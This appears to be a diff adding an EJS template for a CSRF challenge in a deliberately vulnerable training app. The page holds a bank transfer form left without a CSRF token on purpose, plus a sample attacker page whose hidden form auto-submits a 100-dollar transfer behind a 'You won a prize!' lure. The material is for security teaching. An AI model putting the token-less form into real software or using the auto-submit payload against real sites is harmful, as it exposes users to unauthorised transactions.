@@ -1,0 +1,58 @@
+<h2>Cross-Site Request Forgery (CSRF) <span class="badge medium">Challenge</span></h2>
+
+<div class="card">
+  <p style="margin-bottom: 1rem; color: #94a3b8;">
+    This bank transfer form has no CSRF protection. Can you craft a page that makes a user transfer money without their knowledge?
+  </p>
+
+  <% if (message) { %>
+    <div class="alert alert-<%= message.type %>"><%= message.text %></div>
+  <% } %>
+
+  <h3 style="margin-bottom: 0.75rem;">Account Balances</h3>
+  <table>
+    <tr><th>Username</th><th>Balance</th></tr>
+    <% users.forEach(function(u) { %>
+      <tr><td><%= u.username %></td><td>$<%= u.balance.toFixed(2) %></td></tr>
+    <% }); %>
+  </table>
+</div>
+
+<div class="card">
+  <h3 style="margin-bottom: 0.75rem;">Transfer Funds</h3>
+  <%# VULNERABLE: No CSRF token in the form %>
+  <form method="POST" action="/challenges/csrf/transfer">
+    <label style="color: #94a3b8;">From:</label>
+    <select name="from" style="width:100%;padding:0.6rem;background:#0f172a;border:1px solid #475569;border-radius:4px;color:#e2e8f0;margin-bottom:0.75rem;">
+      <% users.forEach(function(u) { %>
+        <option value="<%= u.username %>"><%= u.username %></option>
+      <% }); %>
+    </select>
+    <label style="color: #94a3b8;">To:</label>
+    <select name="to" style="width:100%;padding:0.6rem;background:#0f172a;border:1px solid #475569;border-radius:4px;color:#e2e8f0;margin-bottom:0.75rem;">
+      <% users.forEach(function(u) { %>
+        <option value="<%= u.username %>"><%= u.username %></option>
+      <% }); %>
+    </select>
+    <label style="color: #94a3b8;">Amount:</label>
+    <input type="number" name="amount" placeholder="Amount" step="0.01" min="0.01" required>
+    <input type="submit" value="Transfer">
+  </form>
+</div>
+
+<div class="card">
+  <h3 style="margin-bottom: 0.75rem;">Attacker Page (for testing)</h3>
+  <p style="color: #94a3b8; margin-bottom: 0.5rem;">Save this HTML and open it to simulate a CSRF attack:</p>
+  <pre style="background:#0f172a;padding:1rem;border-radius:4px;overflow-x:auto;font-size:0.85rem;"><code>&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;You won a prize!&lt;/h1&gt;
+  &lt;form id="csrf" method="POST"
+    action="http://vuln-apps:5000/challenges/csrf/transfer"&gt;
+    &lt;input type="hidden" name="from" value="alice"&gt;
+    &lt;input type="hidden" name="to" value="bob"&gt;
+    &lt;input type="hidden" name="amount" value="100"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
